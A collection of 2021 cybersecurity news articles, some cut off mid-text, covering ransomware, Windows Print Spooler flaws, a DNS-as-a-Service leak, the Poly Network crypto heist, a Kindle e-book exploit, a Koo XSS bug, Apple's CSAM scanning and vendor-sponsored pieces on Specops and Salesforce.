significantly. It provides built-in Breached Password Protection and the ability to implement multiple password dictionaries that include disallowed passwords customized for your business. \nRecently Specops has introduced an update to the Breached Password Protection module that includes live attack data. It means that Breached Password Protection protects you from passwords observed as breached in actual attacks. With this new feature, customers can be protected from passwords in breached password dictionaries and live attacks. \nBelow notes the ability to create custom dictionaries and make use of downloadable dictionaries.\nCustom password dictionaries available in Specops Password Policy\nSpecops provides robust Breached Password Protection with the real-time Breached Password API. \nBreached password protection in Specops Password Policy\nWrapping Up\nCredential theft is a dangerous risk for organizations resulting in more costly and lengthy breach events. Attackers often use password spraying attacks to compromise accounts with known passwords and avoid the password lockout policy.\nSpecops Password Policy helps businesses to implement the best practice recommendations needed for a modern cybersecurity posture. It includes breached password protection, password dictionaries, and robust password policy capabilities above and beyond native features in Active Directory.\nIn addition, its breached password protection service includes a new addition of live attack data that protects businesses from real password spray attacks happening right now. \nLearn more about Specops Password Policy and download a free trial here. \n \n \n\n\nFound this article interesting?

Accenture said it has since restored the affected systems from backups.\n\nLockBit, like its now-defunct DarkSide and REvil counterparts, operates using a ransomware-as-a-service (RaaS) model, roping in other cybercriminals (aka affiliates) to carry out the intrusion using its platform, with the payments often divided between the criminal entity directing the attack and the core developers of the malware.\n\nThe ransomware group emerged on the threat landscape in September 2019, and in June 2021 launched LockBit 2.0 along with an advertising campaign to recruit new partners. “LockBit also claims to offer the fastest data exfiltration on the market through StealBit, a data theft tool that can allegedly download 100 GB of data from compromised systems in under 20 minutes,“ Emsisoft noted in a profile of the crime syndicate.\nSome of LockBit’s past victims include the Press Trust of India and Merseyrail.\n\nThe development comes as ransomware incidents have become a critical threat to national and economic security that have left businesses scrambling to pay hefty extortion demands.\nThe spike in attacks against corporate and critical infrastructure have also been increasingly accompanied by a tactic called “triple extortion,“ wherein sensitive data on a target’s systems is extracted prior to locking up through encryption, followed by applying pressure on victim companies into paying up by threatening to publish the stolen data online, failing which, the attackers then adopt a third phase, using that data to blackmail its customers or launch DDoS attacks.\n“Through our security controls and protocols, we identified irregular activity in one of our environments. We immediately contained the matter and isolated the affected servers. We fully restored our affected systems from back up. There was no impact on Accenture’s operations, or on our clients’ systems,“ Accenture said in a statement shared with The Hacker News.\n\n\nFound this article interesting?

'text': 'A day after releasing Patch Tuesday updates, Microsoft acknowledged yet another remote code execution vulnerability in the Windows Print Spooler component, adding that it’s working to remediate the issue in an upcoming security update.\nTracked as CVE-2021-36958 (CVSS score: 7.3), the unpatched flaw is the latest to join a list of bugs collectively known as PrintNightmare that have plagued the printer service and come to light in recent months. Victor Mata of FusionX, Accenture Security, who has been credited with reporting the flaw, said the issue was disclosed to Microsoft in December 2020.\n\n“A remote code execution vulnerability exists when the Windows Print Spooler service improperly performs privileged file operations,“ the company said in its out-of-band bulletin, echoing the vulnerability details for CVE-2021-34481. “An attacker who successfully exploited this vulnerability could run arbitrary code with SYSTEM privileges. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.“\n\nIt’s worth noting that the Windows maker has since released updates to change the default Point and Print default behavior, effectively barring non-administrator users from installing or updating new and existing printer drivers using drivers from a remote computer or server without first elevating themselves to an administrator.\nAs workarounds, Microsoft is recommending users to stop and disable the Print Spooler service to prevent malicious actors from exploiting the vulnerability. The CERT Coordination Center, in a vulnerability note, is also advising users to block outbound SMB traffic to prevent connecting to a malicious shared printer.\n\n\nFound this article interesting?

'text': 'Cybersecurity researchers have disclosed a new class of vulnerabilities impacting major DNS-as-a-Service (DNSaaS) providers that could allow attackers to exfiltrate sensitive information from corporate networks.\n“We found a simple loophole that allowed us to intercept a portion of worldwide dynamic DNS traffic going through managed DNS providers like Amazon and Google,“ researchers Shir Tamari and Ami Luttwak from infrastructure security firm Wiz said.\n\nCalling it a “bottomless well of valuable intel,“ the treasure trove of information contains internal and external IP addresses, computer names, employee names and locations, and details about organizations’ web domains. The findings were presented at the Black Hat USA 2021 security conference last week.\n“The traffic that leaked to us from internal network traffic provides malicious actors all the intel they would ever need to launch a successful attack,“ the researchers added. “More than that, it gives anyone a bird’s eye view on what’s happening inside companies and governments. We liken this to having nation-state level spying capability – and getting it was as easy as registering a domain.“ \n\nThe exploitation process hinges on registering a domain on Amazon’s Route53 DNS service (or Google Cloud DNS) with the same name as the DNS name server — which provides the translation (aka resolution) of domain names and hostnames into their corresponding Internet Protocol (IP) addresses — resulting in a scenario that effectively breaks the isolation between tenants, thus allowing valuable information to be accessed.\nIn other words, by creating a new domain on the Route53 platform inside AWS name server with the same moniker and pointing the hosted zone to their internal network, it causes the Dynamic DNS traffic from Route53 customers’ endpoints to be hijacked and sent directly to the rogue and same-named server, thus creating an easy pathway into mapping corporate networks.\n\n“The dynamic DNS traffic we wiretapped came from over 15,000 organizations, including Fortune 500 companies, 45 U.S. government agencies, and 85 international government agencies,“ the researchers said. “The data included a wealth of valuable intel like internal and external IP addresses, computer names, employee names, and office locations.“\nWhile Amazon and Google have since patched the issues, the Wiz research team has also released a tool to let companies test if their internal DDNS updates are being leaked to DNS providers or malicious actors.\n\n\nFound this article interesting?

'text': 'Hackers have siphoned $611 million worth of cryptocurrencies from a blockchain-based financial network in what’s believed to be one of the largest heists targeting the digital asset industry, putting it ahead of breaches targeting exchanges Coincheck and Mt. Gox in recent years.\nPoly Network, a China-based cross-chain decentralized finance (DeFi) platform for swapping tokens across multiple blockchains such as Bitcoin and Ethereum, on Tuesday disclosed unidentified actors had exploited a vulnerability in its system to plunder thousands of digital tokens such as Ether.\n“The hacker exploited a vulnerability between contract calls,“ Poly Network said. \n\nThe stolen Binance Chain, Ethereum, and Polygon assets are said to have been transferred to three different wallets, with the company urging miners of affected blockchain and centralized crypto exchanges to blocklist tokens coming from the addresses. The three wallet addresses are as follows - \nEthereum: 0xC8a65Fadf0e0dDAf421F28FEAb69Bf6E2E589963 ($273 million)Binance Smart Chain: 0x0D6e286A7cfD25E0c01fEe9756765D8033B32C71 ($253 million)Polygon: 0x5dc3603C9D42Ff184153a8a9094a73d461663214 ($85 million)\nIn an open letter, the protocol maintainers urged the thieves to “establish communication and return the hacked assets.“\n\n“The amount of money you have hacked is one of the biggest in DeFi history. Law enforcement in any country will regard this as a major economic crime and you will be pursued. [...] The money you stole are from tens of thousands of crypto community members, hence the people,“ the team said.\n\nTether’s Chief Technology Officer Paolo Ardoino tweeted that the stablecoin company froze $33 million worth of its tokens that were taken in the haul.\n“We are aware of the poly.network exploit that occurred today. While no one controls BSC (or ETH), we are coordinating with all our security partners to proactively help. There are no guarantees. We will do as much as we can,“ Binance CEO Changpeng Zhao said in a tweet.\nThe identity of the hacker remains unclear, although blockchain security firm SlowMist claimed it was able to trace the attacker email address, IP address, and device fingerprint and that their initial source of funds were in Monero coins, which were then exchanged for ETH, MATIC, and other currencies.\nUpdate: Poly Network on Wednesday said the unknown culprit behind the attack had sent back $261 million worth of crypto assets that were stolen from the platform (Ethereum: $3.3 million, BSC: $256 million, and Polygon: $1 million). While the motive behind returning the stolen digital funds remains unknown, in a “Q&A“ held via Ether transaction notes, the hacker claimed it was “for fun.“\n“The Poly Network hack and subsequent return of funds shows that it’s becoming more difficult to pull off large-scale cryptocurrency theft,“ Blockchain analysis platform Chainalysis said. “That may sound counterintuitive given that this $600 million theft represents the biggest DeFi hack of all time, and that the fast-growing DeFi ecosystem is uniquely vulnerable to hacks. However, cryptocurrency theft is more difficult to get away with than theft of fiat funds. This is due in part to the inherent transparency of blockchains.“\n\n\nFound this article interesting?

This is in addition to seven security flaws it patched in the Microsoft Edge browser on August 5.\nChief among the patched issues is CVE-2021-36948 (CVSS score: 7.8), an elevation of privilege flaw affecting Windows Update Medic Service — a service that enables remediation and protection of Windows Update components — which could be abused to run malicious programs with escalated permissions.\n\nMicrosoft’s Threat Intelligence Center has been credited with reporting the flaw, although the company refrained from sharing additional specifics or detail on how widespread those attacks were in light of active exploitation attempts.\nTwo of the security vulnerabilities are publicly known at the time of release -\nCVE-2021-36942 (CVSS score: 9.8) - Windows LSA Spoofing VulnerabilityCVE-2021-36936 (CVSS score: 8.8) - Windows Print Spooler Remote Code Execution Vulnerability\nWhile CVE-2021-36942 contains fixes to secure systems against NTLM relay attacks like PetitPotam by blocking the LSARPC interface, CVE-2021-36936 resolves yet another remote code execution flaw in the Windows Print Spooler component.\n“An unauthenticated attacker could call a method on the LSARPC interface and coerce the domain controller to authenticate against another server using NTLM,“ Microsoft said in its advisory for CVE-2021-36942; adding the “security update blocks the affected API calls OpenEncryptedFileRawA and OpenEncryptedFileRawW through LSARPC interface.“\nCVE-2021-36936 is also one among the three flaws in the Print Spooler service that Microsoft has fixed this month, with the two other vulnerabilities being CVE-2021-36947 and (CVSS score: 8.2) and CVE-2021-34483 (CVSS score: 7.8), the latter of which concerns an elevation of privilege vulnerability.\nIn addition, Microsoft has released security updates to resolve a previously disclosed remote code execution in the Print Spooler service tracked as CVE-2021-34481 (CVSS score: 8.8). This changes the default behavior of the “Point and Print“ feature, effectively preventing non-administrator users from installing or updating new and existing printer drivers using drivers from a remote computer or server without first elevating themselves to an administrator.\nAnother critical flaw remediated as part of Patch Tuesday updates is CVE-2021-26424 (CVSS score: 9.9), a remote code execution vulnerability in Windows TCP/IP, which Microsoft notes “is remotely triggerable by a malicious Hyper-V guest sending an ipv6 ping to the Hyper-V host.

'text': 'A Chinese cyber espionage group has been linked to a string of intrusion activities targeting Israeli government institutions, IT providers, and telecommunications companies at least since 2019, with the hackers masquerading themselves as Iranian actors to mislead forensic analysis.\nFireEye’s Mandiant threat intelligence arm attributed the campaign to an operator it tracks as “UNC215“, a Chinese espionage operation that’s believed to have singled out organizations around the world dating back as far as 2014, linking the group with “low confidence“ to an advanced persistent threat (APT) widely known as APT27, Emissary Panda, or Iron Tiger.\n“UNC215 has compromised organizations in the government, technology, telecommunications, defense, finance, entertainment, and health care sectors,“ FireEye’s Israel and U.S. threat intel teams said in a report published today.\n\n“The group targets data and organizations which are of great interest to Beijing’s financial, diplomatic, and strategic objectives,“ the findings reflecting a relentless appetite for defense-related secrets among hacking groups.\n\nEarly attacks perpetrated by the collective is said to have exploited a Microsoft SharePoint vulnerability (CVE-2019-0604) as a stepping stone toward infiltrating government and academic networks to deploy web shells and FOCUSFJORD payloads at targets in the Middle East and Central Asia. First described by the NCC Group in 2018, FOCUSFJORD, also called HyperSSL and Sysupdate, is a backdoor that’s part of an arsenal of tools put to use by the Emissary Panda actor.\nUpon gaining an initial foothold, the adversary follows an established pattern of conducting credential harvesting and internal reconnaissance to identify key systems within the target network, before carrying out lateral movement activities to install a custom implant called HyperBro that comes with capabilities such as screen capture and keylogging.\n\nEach phase of the attack is marked by notable efforts undertaken to hinder detection by removing any traces of residual forensic artifacts from compromised machines, while simultaneously improving the FOCUSFJORD backdoor in response to security vendor reports, concealing command-and-control (C2) infrastructure by using other victim networks to proxy their C2 instructions, and even incorporating false flags in an attempt to mislead attribution.\n\nTo that effect, the group deployed a custom web shell called SEASHARPEE that’s associated with Iranian APT groups on at least three occasions, and even used file paths containing references to Iran and displayed error messages in Arabic likely to obfuscate the source of the activity.\nWhat’s more, in a 2019 operation against an Israeli government network, UNC215 obtained access to the primary target via remote desktop protocol (RDP) connections from a trusted third-party using stolen credentials, abusing it to deploy and remotely execute the FOCUSFJORD malware, the cybersecurity firm noted.\n“The activity [...] demonstrates China’s consistent strategic interest in the Middle East,“ the researchers concluded. “This cyber espionage activity is happening against the backdrop of China’s multi-billion-dollar investments related to the Belt and Road Initiative (BRI) and its interest in Israeli’s robust technology sector.“\n“China has conducted numerous intrusion campaigns along the BRI route to monitor potential obstructions—political, economic, and security—and we anticipate that UNC215 will continue targeting governments and organizations involved in these critical infrastructure projects in Israel and the broader Middle East in the near- and mid-term,“ the teams added.\n\n\nFound this article interesting?

{'title': 'A Critical Random Number Generator Flaw Affects Billions of IoT Devices',
'text': 'A critical vulnerability has been disclosed in hardware random number generators used in billions of Internet of Things (IoT) devices whereby it fails to properly generate random numbers, thus undermining their security and putting them at risk of attacks.\n“It turns out that these ’randomly’ chosen numbers aren’t always as random as you’d like when it comes to IoT devices,“ Bishop Fox researchers Dan Petro and Allan Cecil said in an analysis published last week. “In fact, in many cases, devices are choosing encryption keys of 0 or worse. This can lead to a catastrophic collapse of security for any upstream use.“\n\nRandom number generation (RNG) is a crucial process that undergirds several cryptographic applications, including key generation, nonces, and salting. On traditional operating systems, it’s derived from a cryptographically secure pseudorandom number generator (CSPRNG) that uses entropy obtained from a high-quality seed source.\nWhen it comes to IoT devices, this is supplied from a system-on-a-chip (SoC) that houses a dedicated hardware RNG peripheral called a true random number generator (TRNG) that’s used to capture randomness from physical processes or phenomenа.\nStating that the manner in which the peripheral is being current invoked was incorrect, the researchers noted the lack of checks for error code responses across the board, leading to a scenario where the random number generated isn’t simply random, and worse, predictable, resulting in partial entropy, uninitialized memory, and even crypto keys containing plain zeros.\n\n“The HAL function to the RNG peripheral can fail for a variety of reasons, but by far the most common (and exploitable) is that the device has run out of entropy,“ the researchers noted. “Hardware RNG peripherals pull entropy out of the universe through a variety of means (such as analog sensors or EMF readings) but don’t have it in infinite supply.\n“They’re only capable of producing so many random bits per second. If you try calling the RNG HAL function when it doesn’t have any random numbers to give you, it will fail and return an error code. Thus, if the device tries to get too many random numbers too quickly, the calls will begin to fail.“\n\nThe problem is unique to the IoT landscape as they lack an operating system that typically comes with a randomness API (e.g., “/dev/random“ in Unix-like OSes or BCryptGenRandom in Windows), with the researchers highlighting the benefits of a larger entropy pool associated with a CSPRNG subsystem, thus removing “any single points of failure among the entropy sources.“\nAlthough the issues can be remediated with software updates, the ideal solution would be for IoT device manufacturers and developers to include a CSPRNG API that’s seeded from a set of diverse entropy sources and ensure the code doesn’t ignore error conditions, or fail to block calls to the RNG when no more entropy is available.\n“One of the hard parts about this vulnerability is that it’s not a simple case of ’you zigged where you should have zagged’ that can be patched easily,“ the researchers said, stressing the need for implementing CSPRNG in an IoT operating system. “In order to remediate this issue, a substantial and complex feature has to be engineered into the IoT device.“\n\n\nFound this article interesting?

'text': 'Among the problems stemming from our systemic failure with cybersecurity, which ranges from decades-old software-development practices to Chinese and Russian cyber-attacks, one problem gets far less attention than it should—the insider threat.\nBut the reality is that most organizations should be at least as worried about user management as they are about Bond villain-type hackers launching compromises from abroad.\nMost organizations have deployed single sign-on and modern identity-management solutions. These generally allow easy on-boarding, user management, and off-boarding.\nHowever, on mobile devices, these solutions have been less effective. Examples include mobile applications such as WhatsApp, Signal, Telegram, or even SMS-which are common in the workforce.\nAll of these tools allow for low-friction, agile communication in an increasingly mobile business environment. Today, many of these tools offer end-to-end encryption (e2ee), which is a boon when viewed through the lens of protecting against outside attackers. However, e2ee also resists internal governance and compliance programs.\nEven more troubling, these features don’t integrate into existing user-management tools. An existing member of a group needs to be removed from any group communications inside the organization, but with these ad-hoc consumer tools, this management is nearly impossible to guarantee.\nOne often-maligned technology that offers hope to resolve the tension of e2ee and governance is blockchain-based solutions. Bitcoin, which originally put blockchain in common parlance, is known for slow commits (~10 minutes), low transaction throughput, and high monetary and environmental costs.\nBut this blockchain technology has not stood still. Thankfully, newer designs offer options that do away with the shortcomings of bitcoin while still offering trustless operation.\nSpiderOak is a pioneer in using cryptography to protect data not only from criminals but also from the company, meaning that not even the company can read the information users store on their servers.\nWith its CrossClave application, SpiderOak uses a custom-built blockchain to manage identity and access while adhering to end-to-end principles. This lets users have policy-based access controls, simple user management, and one-click off-boarding without trusting us. On top of that, SpiderOak also added e2ee in order to provide a total end-to-end solution to team collaboration.\nTools such as CrossClave that are built on blockchain now offer the best of low-friction, mobile collaboration, and what organizations are in dire need of management, compliance, and control.\nNote: This article is written by Jonathan Moore, the chief technology officer of SpiderOak, a secure-communications data and aerospace company.\n\n\nFound this article interesting?

The list of apps is as follows -\nGG Voucher (com.luxcarad.cardid) Vote European Football (com.gardenguides.plantingfree)GG Coupon Ads (com.free_coupon.gg_free_coupon)GG Voucher Ads (com.m_application.app_moi_6)GG Voucher (com.free.voucher)Chatfuel (com.ynsuper.chatfuel)Net Coupon (com.free_coupon.net_coupon)Net Coupon (com.movie.net_coupon)EURO 2021 Official (com.euro2021)\nThe malicious apps claim to offer Netflix and Google AdWords coupon codes and let users vote for their favorite teams and players at UEFA EURO 2020, which took place between 11 June and 11 July 2021, only under the condition that they log in with their Facebook accounts to cast their vote, or collect the coupon code or credits.\n\n\n\nOnce a user signs into the account, the malware is equipped to steal the victim’s Facebook ID, location, email address, IP address, and the cookies and tokens associated with the Facebook account, thus enabling the threat actor to carry out disinformation campaigns using the victim’s geolocation details or propagate the malware further via social engineering techniques by sending personal messages containing links to the trojan.\n\nThis is achieved using a technique called JavaScript injection, in which “the application opens the legit URL inside a WebView configured with the ability to inject JavaScript code and extracts all the necessary information such as cookies, user account details, location, and IP address by injecting malicious [JavaScript] code,“ Yaswant explained.\n\nWhile the exfiltrated data is hosted on a command-and-control (C2) infrastructure, security flaws found in the C2 server could be exploited to expose the entire database of stolen session cookies to anyone on the internet, thereby putting the victims at further risk.\n“Malicious threat actors are leveraging common user misconceptions that logging into the right domain is always secure irrespective of the application used to log in,“ Yaswant said. “The targeted domains are popular social media platforms and this campaign has been exceptionally effective in harvesting social media session data of users from 144 countries. These accounts can be used as a botnet for different purposes: from boosting the popularity of pages/sites/products to spreading misinformation or political propaganda.“\n\n\nFound this article interesting?

{'title': 'Pulse Secure VPNs Get New Urgent Update for Poorly Patched Critical Flaw',
'text': 'Pulse Secure has shipped a fix for a critical post-authentication remote code execution (RCE) vulnerability in its Connect Secure virtual private network (VPN) appliances to address an incomplete patch for an actively exploited flaw it previously resolved in October 2020.\n“The Pulse Connect Secure appliance suffers from an uncontrolled archive extraction vulnerability which allows an attacker to overwrite arbitrary files, resulting in Remote Code Execution as root,“ NCC Group’s Richard Warren disclosed on Friday. “This vulnerability is a bypass of the patch for CVE-2020-8260.“\n\n“An attacker with such access will be able to circumvent any restrictions enforced via the web application, as well as remount the filesystem, allowing them to create a persistent backdoor, extract and decrypt credentials, compromise VPN clients, or pivot into the internal network,“ Warren added.\nThe disclosure comes days after Ivanti, the company behind Pulse Secure, published an advisory for as many as six security vulnerabilities on August 2, urging customers to move quickly to update to Pulse Connect Secure version 9.1R12 to secure against any exploitation attempts targeting the flaws.\nTracked as CVE-2021-22937 (CVSS score: 9.1), the shortcoming could “allow an authenticated administrator to perform a file write via a maliciously crafted archive uploaded in the administrator web interface,“ according to Pulse Secure. CVE-2020-8260 (CVSS core: 7.2), which concerns an arbitrary code execution flaw using uncontrolled gzip extraction, was remediated in October 2020 with version 9.1R9.“CVE-2021-2293 is a separate vulnerability and is not a bypass of CVE-2020-8260, but is similar in terms of impact and vulnerability type, which is why we assigned a separate CVE,“ Daniel Spicer, Invanti’s vice president of security, said in a statement to The Hacker News.\nThe vulnerability is due to a flaw in the way that archive files (.TAR) are extracted in the administrator web interface. While further checks were added to validate the TAR file to prevent exploitation of CVE-2020-8260, additional variant and patch analysis revealed that it’s possible to exploit the same extraction vulnerability in the part of the source code that handles profiler device databases, effectively getting around the mitigations put in place.\n“Whilst this issue was patched by adding validation to extracted files, this validation does not apply to archives with the ’profiler’ type,“ Warren said. “Therefore, by simply modifying the original CVE-2020-8260 exploit to change the archive type to ’profiler’, the patch can be bypassed, and code execution achieved.“\n\nIt’s worth noting that CVE-2020-8260 was one among the four Pulse Secure flaws that was actively exploited by threat actors earlier this April to stage a series of intrusions targeting defense, government, and financial entities in the U.S. and beyond in a bid to circumvent multi-factor authentication protections and breach enterprise networks. Given the possibility of real-world exploitation, it’s highly recommended to upgrade to Pulse Connect Secure (PCS) 9.1R12, or later.\n“A rigorous code review is just one of the steps we are taking to further bolster our security and protect our customers,“ Spicer said. “For instance, we are also further expanding our existing internal product security resources to ramp up the pace and intensity of testing on existing products as well as those of companies or systems that we integrate into Ivanti.“\n\n\nFound this article interesting?

{'title': 'Apple to Scan Every Device for Child Abuse Content — But Experts Fear for Privacy',
'text': 'Apple on Thursday said it’s introducing new child safety features in iOS, iPadOS, watchOS, and macOS as part of its efforts to limit the spread of Child Sexual Abuse Material (CSAM) in the U.S.\nTo that effect, the iPhone maker said it intends to begin client-side scanning of images shared via every Apple device for known child abuse content as they are being uploaded into iCloud Photos, in addition to leveraging on-device machine learning to vet all iMessage images sent or received by minor accounts (aged under 13) to warn parents of sexually explicit photos shared over the messaging platform.\nFurthermore, Apple also plans to update Siri and Search to stage an intervention when users try to perform searches for CSAM-related topics, alerting that the “interest in this topic is harmful and problematic.“\n“Messages uses on-device machine learning to analyze image attachments and determine if a photo is sexually explicit,“ Apple noted. “The feature is designed so that Apple does not get access to the messages.“ The feature, called Communication Safety, is said to be an opt-in setting that must be enabled by parents through the Family Sharing feature.\nHow Child Sexual Abuse Material is Detected\nDetection of known CSAM images involves carrying out on-device matching using a database of known CSAM image hashes provided by the National Center for Missing and Exploited Children (NCMEC) and other child safety organizations before the photos are uploaded to the cloud. “NeuralHash,“ as the system is called, is powered by a cryptographic technology known as private set intersection. However, it’s worth noting that while the scanning happens automatically, the feature only works when iCloud photo sharing is turned on.\n\nWhat’s more, Apple is expected to use another cryptographic principle called threshold secret sharing that allows it to “interpret“ the contents if an iCloud Photos account crosses a threshold of known child abuse imagery, following which the content is manually reviewed to confirm there is a match, and if so, disable the user’s account, report the material to NCMEC, and pass it on to law enforcement.\nResearchers Express Concern About Privacy\nApple’s CSAM initiative has prompted security researchers to express anxieties that it could suffer from a mission creep and be expanded to detect other kinds of content that could have political and safety implications, or even frame innocent individuals by sending them harmless but malicious images designed to appear as matches for child porn. \nU.S. whistle-blower Edward Snowden tweeted that, despite the project’s good intentions, what Apple is rolling out is “mass surveillance,“ while Johns Hopkins University cryptography professor and security expert Matthew Green said, “the problem is that encryption is a powerful tool that provides privacy, and you can’t really have strong privacy while also surveilling every image anyone sends.“\n\nApple already checks iCloud files and images sent over email against known child abuse imagery, as do tech giants like Google, Twitter, Microsoft, Facebook, and Dropbox, who employ similar image hashing methods to look for and flag potential abuse material, but the company’s attempt to walk a privacy tightrope could renew debates about weakening encryption, escalating a long-running tug of war over privacy and policing in the digital age. \nThe New York Times, in a 2019 investigation, revealed that a record 45 million online photos and videos of children being sexually abused were reported in 2018, out of which Facebook Messenger accounted for nearly two-thirds, with Facebook as a whole responsible for 90% of the reports.\nThe impending changes also mark somewhat of an about-face for a company that, along with Facebook-owned WhatsApp, has continually resisted efforts to intentionally weaken encryption and backdoor its systems. That said, Reuters reported last year that the company abandoned plans to encrypt users’ full backups to iCloud in 2018 after the U.S. Federal Bureau of Investigation (FBI) raised concerns that doing so would impede investigations.\n“Child exploitation is a serious problem, and Apple isn’t the first tech company to bend its privacy-protective stance in an attempt to combat it. But that choice will come at a high price for overall user privacy,“ the Electronic Frontier Foundation (EFF) said in a statement, noting that Apple’s move could break encryption protections and open the door for broader abuses.\n“All it would take to widen the narrow backdoor that Apple is building is an expansion of the machine learning parameters to look for additional types of content, or a tweak of the configuration flags to scan, not just children’s, but anyone’s accounts. That’s not a slippery slope; that’s a fully built system just waiting for external pressure to make the slightest change,“ it added.\nThe CSAM efforts are set to roll out in the U.S. in the coming months as part of iOS 15 and macOS Monterey, but it remains to be seen if, or when, it would be available internationally. In December 2020, Facebook was forced to switch off some of its child abuse detection tools in Europe in response to recent changes to the European Commission’s ePrivacy Directive that effectively ban automated systems scanning for child sexual abuse images and other illegal content without users’ explicit consent.\n\n\nFound this article interesting?

'text': 'Amazon earlier this April addressed a critical vulnerability in its Kindle e-book reader platform that could have been potentially exploited to take full control over a user’s device, resulting in the theft of sensitive information by just deploying a malicious e-book.\n“By sending Kindle users a single malicious e-book, a threat actor could have stolen any information stored on the device, from Amazon account credentials to billing information,“ Yaniv Balmas, head of cyber research at Check Point, said in an emailed statement. “The security vulnerabilities allow an attacker to target a very specific audience.“\n\nIn other words, if a threat actor wanted to single out a specific group of people or demographic, it’s possible for the adversary to choose a popular e-book in a language or dialect that’s widely spoken among the group to tailor and orchestrate a highly targeted cyber attack.\nUpon responsibly disclosing the issue to Amazon in February 2021, the retail and entertainment giant published a fix as part of its 5.13.5 version of Kindle firmware in April 2021.\nAttacks exploiting the flaw commence by sending a malicious e-book to an intended victim, who, upon opening the book, triggers the infection sequence sans any interaction, allowing the bad actor to delete the user’s library, gain full access to the Amazon account, or convert the Kindle into a bot for striking other devices in the target’s local network.\nHeap overflow vulnerability in the JBIG2Globals decoding algorithm\nThe problem resides in the firmware’s e-book parsing framework, specifically in the implementation associated with how PDF documents are opened, permitting an attacker to execute a malicious payload on the device.\nThis is made possible, thanks to a heap overflow vulnerability in the PDF rendering function (CVE-2021-30354), which can be leveraged to gain arbitrary write primitive, and a local privilege escalation flaw in the Kindle application manager service (CVE-2021-30355) that enables the threat actor to chain the two flaws to run malware-laced code as a root user.\n\nEarlier this January, Amazon fixed similar weaknesses — collectively named “KindleDrip“ — that could have allowed an attacker to take control of victims’ devices by delivering a malicious e-book to the targets and make unauthorized purchases.\n“Kindle, like other IoT devices, are often thought of as innocuous and disregarded as security risks,“ Balmas said. “These IoT devices are vulnerable to the same attacks as computers. Everyone should be aware of the cyber risks in using anything connected to the computer, especially something as ubiquitous as Amazon’s Kindle.“\n\n\nFound this article interesting?

'text': 'Koo, India’s homegrown Twitter clone, recently patched a serious security vulnerability that could have been exploited to execute arbitrary JavaScript code against hundreds of thousands of its users, spreading the attack across the platform.\nThe vulnerability involves a stored cross-site scripting flaw (also known as persistent XSS) in Koo’s web application that allows malicious scripts to be embedded directly into the affected web application.\nTo carry out the attack, all a malicious actor had to do was log into the service via the web application and post an XSS-encoded payload to its timeline, which automatically gets executed on behalf of all users who saw the post.\n\nThe issue was discovered by security researcher Rahul Kankrale in July, following which a fix was rolled out by Koo on July 3.\nUsing cross-site scripting, an attacker can perform actions on behalf of users with the same privileges as the user and steal web browser’s secrets, such as authentication cookies.\nDue to the fact that malicious JavaScript has access to all objects that the website can access, it could allow adversaries to sneak into sensitive data such as private messages, or spread misinformation, or display spam using users’ profiles.\n\nThe end result of this vulnerability in Koo, also known as XSS worm, is more worrisome because it automatically propagates malicious code among a website’s visitors to infect other users—without any user interaction, like a chain reaction.\nKoo, which launched in November 2019, bills itself as an Indian alternative to Twitter and boasts of 6 million active users on its platform. The Bengaluru-based company has also emerged as the social media service of choice in Nigeria after the country indefinitely banned Twitter for deleting a tweet by Nigerian President Muhammadu Buhari.\n\nAprameya Radhakrishna, co-founder, and chief executive officer of Koo, announced the entry of the app into the Nigerian market earlier this week.\nAlso patched was a reflected XSS vulnerability associated with the hashtag feature, thus allowing an adversary to pass malicious JavaScript code in the endpoint used for searching for a specific hashtag (“https://www[.]kooapp[.]com/tag/[hashtag]“).\nThe fixes follow another critical vulnerability in the Koo app was patched earlier this February that could have allowed attackers to gain access to any user account on the platform without requiring a password or user interaction.\n\nIt was discovered by Prasoon Gupta, an independent security researcher. In an interview with The Hacker News, Prasoon explained that the vulnerability arises due to the way the app validates access tokens when a user is authenticated with a phone number and an one-time password (OTP) sent to it.\nThe disclosure comes a little over a month after similar XSS-related vulnerabilities were uncovered in Microsoft’s Edge browser, which can be exploited to trigger an attack simply by adding a comment to a YouTube video or sending a Facebook friend request from an account that contains non-English language content accompanied by an XSS payload.\n\n\nFound this article interesting?

{'title': 'Salesforce Release Updates — A Cautionary Tale for Security Teams',
'text': 'On the surface, Salesforce seems like a classic Software-as-a-Service (SaaS) platform. Someone might even argue that Salesforce invented the SaaS market. However, the more people work with the full offering of Salesforce, the more they realize that it goes beyond a traditional SaaS platform’s capabilities.\nFor example, few people talk about managing the security aspects of Salesforce Release Updates. By understanding what Release Updates are, why they pose a security risk, and how security teams can mitigate risk, Salesforce customers can better protect sensitive information. \nHow to ensure the right configurations for your Salesforce security\nWhat are Salesforce Release Updates?\nSince Salesforce does not automatically update its platform, it does not follow the traditional SaaS model. For example, most SaaS platforms have two types of releases, security, and product improvements. Urgent security updates are released as soon as a security vulnerability is known, and product improvements are released on fixed dates, such as quarterly or monthly. As part of the SaaS model, the vendor automatically updates the platform. \nThe update and patching policy benefits the customer and the SaaS provider. The customers don’t need to worry about updating the system so they can focus on the core aspects of their business. Meanwhile, the SaaS provider does not need to develop multiple update versions or worry about the most recent version installed by the customer. \nBetter yet, the SaaS provider does not need to worry that customers will experience a security breach because it automatically installs the security patch for everyone. It just makes everyone’s life easier and is one of the reasons that SaaS platforms are immensely popular. \nSalesforce Updates Work Differently\nSalesforce works differently, very differently. They use a hybrid system that is similar in some ways to traditional software that requires the customer to apply updates until EOL and a modern SaaS platform. Salesforce offers regular seasonal service updates and security updates as needed. However, neither update is implemented automatically. \nSalesforce gives admins a “grace period“ where they can choose to update the platform. At the end of this period, Salesforce pushes the update through automatically. \nFor example, Salesforce introduced the Enforce OAuth Scope for Lightning Apps security update in Summer 2021. The provider recommends that organizations apply it by September 2021. However, Salesforce will not enforce it until Winter 2022. This is an important security update, but customers do not need to install it immediately. \nWhy Salesforce Updates Work Differently\nWhile Salesforce encourages admins to run through a checklist and apply the updates, it realizes that customers rely on the platform’s flexibility and that changes can impact the customizations, like custom developments and integrations. \nSince any update can be catastrophic for an organization, Salesforce gives customers time to review the update’s content and prepare the organization’s Salesforce before activating the changes. \nWhat is the importance of Salesforce Security Updates?\nThe Salesforce Security Updates are, as the name suggests, for security purposes. They are published to fix a security issue, prevent attacks, and strengthen the security posture of a Salesforce tenant. Therefore, customers should install them as soon as possible. \nOnce Salesforce publishes an update, the vulnerability it is patching becomes general knowledge. This knowledge means the weakness is equal to a common vulnerability or exposure (CVE) but without the assigned number. Bad actors can easily get access to all the information regarding the exposure and create an attack vector that utilizes the published vulnerability. This places all organizations that have not enforced the security update vulnerable to an attack. \nSince most attacks are based on known, published, 1-day vulnerabilities, waiting to apply the 